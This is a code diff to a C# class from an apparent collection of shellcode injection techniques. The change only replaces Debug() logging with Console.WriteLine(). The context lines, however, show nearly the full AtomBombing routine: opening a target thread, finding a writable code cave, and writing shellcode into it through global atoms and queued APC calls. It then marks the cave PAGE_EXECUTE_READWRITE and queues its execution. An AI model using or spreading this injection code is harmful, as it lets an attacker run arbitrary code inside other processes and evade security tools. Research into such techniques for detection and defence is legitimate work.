@@ -27,22 +27,22 @@ namespace ShellcodeInjectionTechniques
         public void Run(Process target, byte[] shellcode)
         {
             ProcessThread thread = GetThread(target.Threads);
-            Debug("[+] Found thread: {0}", new string[] { thread.Id.ToString() });
+            Console.WriteLine("[+] Found thread: {0}", new string[] { thread.Id.ToString() });
 
             // get a handle to the thread
             IntPtr hThread = OpenThread(ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, (UInt32)thread.Id);
-            Debug("[+] OpenThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
+            Console.WriteLine("[+] OpenThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
 
             // need to find a remote page we can write to
             PageHelper[] pWritablePages = FindWritablePages(target.Handle, thread.StartAddress);
             //FindWritablePage(target.Handle, thread.StartAddress);
             if (pWritablePages.Length == 0)
             {
-                Debug("[!] Unable to find writable page!");
+                Console.WriteLine("[!] Unable to find writable page!");
                 return;
             }
             else
-                Debug("[+] FindWritablePages() - number found: {0}", new string[] { pWritablePages.Length.ToString() });
+                Console.WriteLine("[+] FindWritablePages() - number found: {0}", new string[] { pWritablePages.Length.ToString() });
 
             // try to find a code cave in the writable pages to atom bomb our shellcode
             IntPtr pWritable = IntPtr.Zero;
@@ -56,17 +56,17 @@ namespace ShellcodeInjectionTechniques
             // we did not find a suitable code cave
             if (pWritable == IntPtr.Zero)
             {
-                Debug("[!] Unable to find a suitable code cave!");
+                Console.WriteLine("[!] Unable to find a suitable code cave!");
                 return;
             }
             else
-                Debug("[+] Found a suitable code cave - pWritable: 0x{0}", new string[] { pWritable.ToString("X") });
+                Console.WriteLine("[+] Found a suitable code cave - pWritable: 0x{0}", new string[] { pWritable.ToString("X") });
 
             IntPtr codeCave = pWritable;
 
             // get the proc address - GlobalGetAtomNameA
             IntPtr pGlobalGetAtomNameW = GetProcAddress(GetModuleBaseAddress("kernel32.dll"), "GlobalGetAtomNameW");
-            Debug("[+] GetProcAddress() - pGlobalGetAtomNameW: 0x{0}", new string[] { pGlobalGetAtomNameW.ToString("X") });
+            Console.WriteLine("[+] GetProcAddress() - pGlobalGetAtomNameW: 0x{0}", new string[] { pGlobalGetAtomNameW.ToString("X") });
 
             
             // define a chunk size to write our atom names (note: an atom name can be 255 max size)
@@ -92,11 +92,11 @@ namespace ShellcodeInjectionTechniques
                     fixed (byte* ptr = shellcodeChunk)
                     {
                         UInt16 ATOM = GlobalAddAtomW((IntPtr)ptr);
-                        Debug("[+] GlobalAddAtom() - ATOM: 0x{0}", new string[] { ATOM.ToString("X") });
+                        Console.WriteLine("[+] GlobalAddAtom() - ATOM: 0x{0}", new string[] { ATOM.ToString("X") });
 
                         // queue the APC thread
                         NtQueueApcThread(hThread, pGlobalGetAtomNameW, ATOM, pWritable, chunkSize * 2);
-                        Debug("[+] NtQueueApcThread() - pWritable: 0x{0}", new string[] { pWritable.ToString("X") });
+                        Console.WriteLine("[+] NtQueueApcThread() - pWritable: 0x{0}", new string[] { pWritable.ToString("X") });
 
                         // increment to the next writable memory location
                         pWritable += chunkSize;
@@ -105,13 +105,13 @@ namespace ShellcodeInjectionTechniques
             }
 
             IntPtr pVirtualProtect = GetProcAddress(GetModuleBaseAddress("kernel32.dll"), "VirtualProtect");
-            Debug("[+] GetProcAddress() - pVirtualProtect: 0x{0}", new string[] { pVirtualProtect.ToString("X") });
+            Console.WriteLine("[+] GetProcAddress() - pVirtualProtect: 0x{0}", new string[] { pVirtualProtect.ToString("X") });
 
             NtQueueApcThread(hThread, pVirtualProtect, (UInt32)codeCave, (IntPtr)shellcode.Length, (Int32)(MemoryProtection.PAGE_EXECUTE_READWRITE));
-            Debug("[+] NtQueueApcThread() PAGE_EXECUTE_READWRITE - codeCave: 0x{0}", new string[] { codeCave.ToString("X") });
+            Console.WriteLine("[+] NtQueueApcThread() PAGE_EXECUTE_READWRITE - codeCave: 0x{0}", new string[] { codeCave.ToString("X") });
 
             QueueUserAPC(codeCave, hThread, IntPtr.Zero);
-            Debug("[+] QueueUserAPC() - codeCave: 0x{0}", new string[] { codeCave.ToString("X") });
+            Console.WriteLine("[+] QueueUserAPC() - codeCave: 0x{0}", new string[] { codeCave.ToString("X") });
         }
 
         ProcessThread GetThread(ProcessThreadCollection threads)
